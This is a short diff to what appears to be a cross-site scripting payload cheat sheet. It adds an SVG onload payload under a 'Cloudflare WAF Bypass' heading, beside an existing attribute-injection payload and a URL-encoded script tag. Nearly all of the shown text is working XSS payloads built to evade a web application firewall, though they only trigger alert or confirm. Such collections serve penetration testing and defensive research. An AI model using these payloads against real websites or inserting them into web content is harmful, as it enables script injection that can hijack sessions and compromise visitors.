@@ -1181,11 +1181,13 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 ```
 ### Cloudflare WAF Bypass by [@mindbl0w](https://bugcrowd.com/mindbl0w) - 21 September 2021
 
-##### On Meta Tag (Alt + X) / (Alt + Shift + X)
-
 ```javascript
 " onXXXXxxxXxXxXXx=() onclick=confirm(1) accesskey=X test="
 ```
+```html
+<svg/onx=[]/onload=alert(1)>
+```
+
 ## References
 
 - [Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
